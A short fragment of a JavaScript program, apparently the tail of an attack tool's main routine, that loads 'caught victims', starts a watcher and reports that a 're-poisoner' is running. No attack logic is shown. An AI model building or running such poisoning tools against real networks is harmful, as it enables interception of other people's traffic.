  console.error(`[DEBUG] No victims loaded. Exiting.`);
  process.exit(1);
}

await loadCaughtVictims();

console.log('[DEBUG] Starting watcher...');
startWatcher();
logger.info('Re‑poisoner is running. Press Ctrl+C to stop.');